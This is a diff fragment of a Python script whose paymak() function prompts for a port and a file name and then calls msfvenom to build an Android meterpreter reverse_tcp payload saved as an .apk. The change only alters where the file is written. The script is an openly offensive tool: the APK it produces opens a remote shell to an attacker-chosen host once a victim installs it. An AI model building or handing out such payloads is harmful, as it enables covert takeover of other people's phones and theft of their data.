@@ -46,7 +46,7 @@ def paymak():
 	port = input("\033[36m ["+"\033[32m*"+"\033[36m]"+"\033[32m enter lport"+"\033[33m use 8080 it the best port "+"\033[32m : "+"\033[37m")
 	if port.isnumeric() == True: 
 		name = input("\033[36m ["+"\033[32m*"+"\033[36m]"+"\033[32m enter a name for the payload "+"\033[33m without "+"\033[36m("+"\033[34m .apk"+"\033[36m)"+"\033[32m : "+"\033[37m")
-		os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT = {port} R > /sdcard/{name}.apk")
+		os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT = {port} R > /Desktop/{name}.apk")
 		print("\033[35m ["+"\033[32m*"+"\033[35m]"+"\033[36m DONE"+"\033[37m")
 		time.sleep(2)
 		os.system("clear")
